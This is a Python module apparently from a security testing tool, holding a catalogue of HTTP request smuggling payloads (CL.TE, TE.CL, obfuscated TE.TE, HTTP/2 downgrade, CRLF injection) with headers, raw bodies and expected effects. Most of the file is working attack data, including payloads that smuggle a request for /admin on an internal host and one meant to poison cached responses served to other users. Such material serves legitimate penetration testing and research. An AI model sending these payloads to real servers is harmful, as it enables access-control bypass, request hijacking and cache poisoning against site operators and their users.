"""
HTTP Request Smuggling Payload Database
All known smuggling techniques and their payloads
"""

from dataclasses import dataclass, field
from typing import List, Optional, Tuple


@dataclass
class SmugglePayload:
    name: str
    technique: str
    description: str
    severity: str  # critical, high, medium, low
    headers: dict
    body: str
    expected_behavior: str
    references: List[str] = field(default_factory=list)
    tags: List[str] = field(default_factory=list)
    raw_headers: List[Tuple[str, str]] = field(default_factory=list)


# --- CL.TE Payloads ---

CL_TE_BASIC = SmugglePayload(
    name="CL.TE Basic",
    technique="CL.TE",
    description="Front-end uses Content-Length, back-end uses Transfer-Encoding",
    severity="critical",
    headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "6",
        "Transfer-Encoding": "chunked",
    },
    body="0\r\n\r\nG",
    expected_behavior="Backend processes 'G' as start of next request — causes 405 or timeout on next legitimate request",
    references=["https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te"],
    tags=["cl.te", "basic", "critical"],
)

CL_TE_TIMEOUT = SmugglePayload(
    name="CL.TE Timeout Detection",
    technique="CL.TE",
    description="Timing-based detection: backend hangs waiting for chunked body terminator",
    severity="high",
    headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "4",
        "Transfer-Encoding": "chunked",
    },
    body="1\r\nA",  # Never sends trailing 0\r\n\r\n — backend times out
    expected_behavior="Response takes significantly longer than baseline — backend is waiting for chunk terminator",
    references=["https://portswigger.net/web-security/request-smuggling/finding"],
    tags=["cl.te", "timing", "detection"],
)

# --- TE.CL Payloads ---

TE_CL_BASIC = SmugglePayload(
    name="TE.CL Basic",
    technique="TE.CL",
    description="Front-end uses Transfer-Encoding, back-end uses Content-Length",
    severity="critical",
    headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "3",
        "Transfer-Encoding": "chunked",
    },
    body="8\r\nSMUGGLED\r\n0\r\n\r\n",
    expected_behavior="Backend reads only 3 bytes (Content-Length), leaving 'SMUGGLED\\r\\n0\\r\\n\\r\\n' in TCP buffer",
    references=["https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl"],
    tags=["te.cl", "basic", "critical"],
)

TE_CL_TIMEOUT = SmugglePayload(
    name="TE.CL Timeout Detection",
    technique="TE.CL",
    description="Timing-based TE.CL detection via Content-Length mismatch",
    severity="high",
    headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "6",
        "Transfer-Encoding": "chunked",
    },
    body="0\r\n\r\nX",
    expected_behavior="Backend times out waiting for 6 bytes of body it expects via Content-Length",
    references=["https://portswigger.net/web-security/request-smuggling/finding"],
    tags=["te.cl", "timing", "detection"],
)

# --- TE.TE Obfuscation Payloads ---

TE_TE_SPACE_BEFORE_COLON = SmugglePayload(
    name="TE.TE Space Before Colon",
    technique="TE.TE",
    description="Obfuscated Transfer-Encoding via space before colon — confuses one proxy layer",
    severity="high",
    headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "6",
        "Transfer-Encoding ": "chunked",  # Space before colon
    },
    body="0\r\n\r\nG",
    expected_behavior="One layer processes chunked, the other ignores the obfuscated header and uses CL",
    references=["https://portswigger.net/web-security/request-smuggling/exploiting"],
    tags=["te.te", "obfuscation", "space"],
)

TE_TE_DUPLICATE_HEADER = SmugglePayload(
    name="TE.TE Duplicate Header",
    technique="TE.TE",
    description="Duplicate Transfer-Encoding headers — each proxy picks a different one",
    severity="high",
    headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "6",
    },
    body="0\r\n\r\nG",
    expected_behavior="One proxy uses 'chunked', other uses 'identity', causing desync",
    references=["https://portswigger.net/web-security/request-smuggling"],
    tags=["te.te", "obfuscation", "duplicate"],
    raw_headers=[
        ("Content-Type", "application/x-www-form-urlencoded"),
        ("Content-Length", "6"),
        ("Transfer-Encoding", "chunked"),
        ("Transfer-Encoding", "identity"),
    ],
)

TE_TE_JUNK_CHUNK = SmugglePayload(
    name="TE.TE Junk Chunk Extension",
    technique="TE.TE",
    description="Chunk extension with junk value to bypass WAF normalization",
    severity="high",
    headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "6",
        "Transfer-Encoding": "chunked;ext=junk",
    },
    body="0\r\n\r\nG",
    expected_behavior="WAF ignores malformed TE header, backend processes chunked body normally",
    references=["https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn"],
    tags=["te.te", "obfuscation", "waf-bypass"],
)

TE_TE_NEWLINE_OBFUSCATION = SmugglePayload(
    name="TE.TE Newline Tab Obfuscation",
    technique="TE.TE",
    description="Transfer-Encoding with tab/newline obfuscation",
    severity="high",
    headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "6",
        "Transfer-Encoding": "\tchunked",  # Tab prefix
    },
    body="0\r\n\r\nG",
    expected_behavior="Parser that strips tabs processes as chunked, strict parser ignores header",
    references=["https://portswigger.net/web-security/request-smuggling"],
    tags=["te.te", "obfuscation", "tab"],
)

TE_TE_NULL_BYTE = SmugglePayload(
    name="TE.TE Null Byte Obfuscation",
    technique="TE.TE",
    description="Null byte injected in Transfer-Encoding value",
    severity="high",
    headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "6",
        "Transfer-Encoding": "chunked\x00",
    },
    body="0\r\n\r\nG",
    expected_behavior="Some parsers treat null-terminated string as 'chunked', others reject it",
    references=["https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn"],
    tags=["te.te", "obfuscation", "null-byte"],
)

# --- HTTP/2 Downgrade Smuggling ---
# NOTE: H2 smuggling requires raw HTTP/2 frame construction for full effectiveness.
# Current httpx-based detection is limited — see detect_h2_smuggling() for details.

H2_CL_SMUGGLING = SmugglePayload(
    name="H2.CL Smuggling",
    technique="H2.CL",
    description="HTTP/2 request with injected Content-Length to desync HTTP/1.1 backend",
    severity="critical",
    headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "0",
    },
    body="GET /smuggled HTTP/1.1\r\nHost: target.com\r\n\r\n",
    expected_behavior="HTTP/2 frontend downgrades to HTTP/1.1, smuggled prefix poisons backend queue",
    references=[
        "https://portswigger.net/web-security/request-smuggling/advanced",
        "https://portswigger.net/research/http2",
    ],
    tags=["h2", "h2.cl", "downgrade", "critical"],
)

H2_TE_SMUGGLING = SmugglePayload(
    name="H2.TE Smuggling",
    technique="H2.TE",
    description="Transfer-Encoding injected in HTTP/2 headers (forbidden by spec but accepted by some)",
    severity="critical",
    headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "Transfer-Encoding": "chunked",
    },
    body="0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n",
    expected_behavior="HTTP/2 -> HTTP/1.1 downgrade with TE header forwarded — backend processes smuggled request",
    references=["https://portswigger.net/web-security/request-smuggling/advanced/http2-exclusive-vectors"],
    tags=["h2", "h2.te", "downgrade", "critical"],
)

H2_REQUEST_LINE_INJECTION = SmugglePayload(
    name="H2 Request Line Injection",
    technique="H2.RL",
    description="Newline injection in HTTP/2 pseudo-headers to inject a second request (requires raw HTTP/2 frame construction)",
    severity="critical",
    headers={
        "Content-Type": "application/x-www-form-urlencoded",
    },
    body="",
    expected_behavior="Injected newline in :path or :method header creates a second HTTP/1.1 request on backend",
    references=["https://portswigger.net/web-security/request-smuggling/advanced/http2-exclusive-vectors"],
    tags=["h2", "header-injection", "critical"],
)

# --- Header Injection / CRLF ---

CRLF_HEADER_INJECTION = SmugglePayload(
    name="CRLF Header Injection",
    technique="CRLF",
    description="CRLF sequences in header values to inject additional HTTP headers",
    severity="high",
    headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Test": "value\r\nTransfer-Encoding: chunked",
    },
    body="0\r\n\r\n",
    expected_behavior="Injected CRLF adds Transfer-Encoding header, causing desync",
    references=["https://owasp.org/www-community/attacks/HTTP_Response_Splitting"],
    tags=["crlf", "header-injection"],
)

# --- Cache Poisoning via Smuggling ---

CACHE_POISON_SMUGGLE = SmugglePayload(
    name="Cache Poisoning via Smuggling",
    technique="CL.TE",
    description="Smuggle a request to poison cached responses for other users",
    severity="critical",
    headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "50",
        "Transfer-Encoding": "chunked",
    },
    body="0\r\n\r\nGET /poison HTTP/1.1\r\nHost: target\r\nFoo: x",
    expected_behavior="Poisoned response served from cache to subsequent users requesting legitimate resources",
    references=["https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning"],
    tags=["cl.te", "cache-poisoning", "critical"],
)

# --- All Payloads Registry ---

ALL_PAYLOADS: List[SmugglePayload] = [
    CL_TE_BASIC,
    CL_TE_TIMEOUT,
    TE_CL_BASIC,
    TE_CL_TIMEOUT,
    TE_TE_SPACE_BEFORE_COLON,
    TE_TE_DUPLICATE_HEADER,
    TE_TE_JUNK_CHUNK,
    TE_TE_NEWLINE_OBFUSCATION,
    TE_TE_NULL_BYTE,
    H2_CL_SMUGGLING,
    H2_TE_SMUGGLING,
    H2_REQUEST_LINE_INJECTION,
    CRLF_HEADER_INJECTION,
    CACHE_POISON_SMUGGLE,
]

TECHNIQUES = {
    "CL.TE": [p for p in ALL_PAYLOADS if p.technique == "CL.TE"],
    "TE.CL": [p for p in ALL_PAYLOADS if p.technique == "TE.CL"],
    "TE.TE": [p for p in ALL_PAYLOADS if p.technique == "TE.TE"],
    "H2.CL": [p for p in ALL_PAYLOADS if p.technique == "H2.CL"],
    "H2.TE": [p for p in ALL_PAYLOADS if p.technique == "H2.TE"],
    "H2.RL": [p for p in ALL_PAYLOADS if p.technique == "H2.RL"],
    "CRLF":  [p for p in ALL_PAYLOADS if p.technique == "CRLF"],
}

SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3}


def get_payloads_by_technique(technique: str) -> List[SmugglePayload]:
    return TECHNIQUES.get(technique.upper(), [])


def get_payloads_by_severity(severity: str) -> List[SmugglePayload]:
    return [p for p in ALL_PAYLOADS if p.severity == severity.lower()]


def get_all_techniques() -> List[str]:
    return list(TECHNIQUES.keys())
